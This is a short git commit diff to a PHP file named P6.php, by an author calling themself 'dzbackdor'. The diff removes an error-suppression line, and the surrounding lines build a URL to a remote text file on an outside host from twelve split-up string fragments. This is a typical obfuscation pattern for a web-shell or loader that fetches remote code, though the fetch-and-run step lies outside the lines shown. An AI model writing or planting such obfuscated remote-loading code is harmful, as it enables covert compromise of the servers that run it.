080b9161e2f24f736b7693b78da53bf42bfd4a1b
dzbackdor <141788825+Dzbackdor@users.noreply.github.com>
2025-09-30 13:59:09 +0700

    Update P6.php

--- P6.php
+++ P6.php
@@ -1,5 +1,4 @@
 <?php
-@error_reporting(0);
 $p1 = "htt"; $p2 = "ps:/"; $p3 = "/amp"; $p4 = "nyapu"; $p5 = "nyaku"; $p6 = ".top"; 
 $p7 = "/tool"; $p8 = "s/s-m"; $p9 = "edia"; $p10 = "/med"; $p11 = "ia-ne"; $p12 = "w.txt";
 $url = $p1 . $p2 . $p3 . $p4 . $p5 . $p6 . $p7 . $p8 . $p9 . $p10 . $p11 . $p12;
